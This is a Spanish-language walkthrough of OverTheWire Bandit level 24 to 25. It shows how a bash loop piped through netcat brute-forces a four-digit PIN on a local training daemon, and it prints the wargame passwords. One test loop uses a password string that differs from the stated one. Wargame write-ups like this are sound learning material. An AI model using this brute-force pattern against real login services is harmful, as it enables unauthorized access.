# Level 24 al 25

## Objetivo.

Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le proporciona la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN, excepto pasando por todas las 10000 combinaciones, lo que se conoce como fuerza bruta.
No necesita crear nuevas conexiones cada vez

## Datos de acceso al nivel.

bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solución.

bandit24@bandit:~$ nc -v localhost 30002
Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Timeout. Exiting.

bandit24@bandit:~$ for i in {0000..0003}; do  echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
bandit24@bandit:~$  for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.

## Notas opcionales.

 Hay un servicio ejecutándose en el puerto 30002 y que usa un PIN de 4 dígitos para la autenticación. Si somos capaces de autenticarnos y enviar al servicio la contraseña de bandit24, se nos dará la contraseña de bandit25.

Como no conocemos el PIN, la única forma de encontrar el PIN correcto es por fuerza bruta. La fuerza bruta no es más que probar todas las combinaciones posibles para un campo hasta encontrar la combinación correcta.

Entonces se conecta al daemon usando Netcat.

Cuando sabemos el formato en el que se deben enviar los datos al servicio, escribamos un método de fuerza bruta simple usando bucles que probaron todos los números que se encuentran entre 0000 y 9999, ambos inclusive (Todos los números de 4 dígitos que se encuentran entre este rango). Veamos un fragmento de código para "bucle for".

## Referencias.

https://overthewire.org/wargames/bandit/bandit25.html
https://david-varghese.medium.com/overthewire-bandit-level-24-level-25-517fb11f93a3